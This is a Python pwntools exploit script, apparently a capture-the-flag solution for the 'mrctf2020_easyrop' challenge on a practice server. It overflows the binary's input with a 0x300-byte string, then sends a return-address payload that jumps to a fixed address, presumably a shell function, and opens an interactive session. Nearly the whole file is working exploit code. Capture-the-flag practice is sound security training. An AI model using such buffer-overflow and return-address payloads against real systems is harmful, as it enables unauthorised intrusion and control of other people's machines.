# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './mrctf2020_easyrop'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25904'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('>',num)

sl("2")
#sa("hehehehehehehe","a"*0x300)
se("a"*0x300)
# 远程和本地很不一样，草

# pause()
sl("7")
ret = 0x0000000000400596
payload = "b"*8 +"bb"  + p64(0)+ p64(ret) +  p64(0x000000000040072A)
#sa("bybybybybybyby",payload)
se(payload)



p.interactive()

'''
@File    :   mrctf2020_easyrop.py
@Time    :   2021/07/21 23:20:32
@Author  :   Niyah 
'''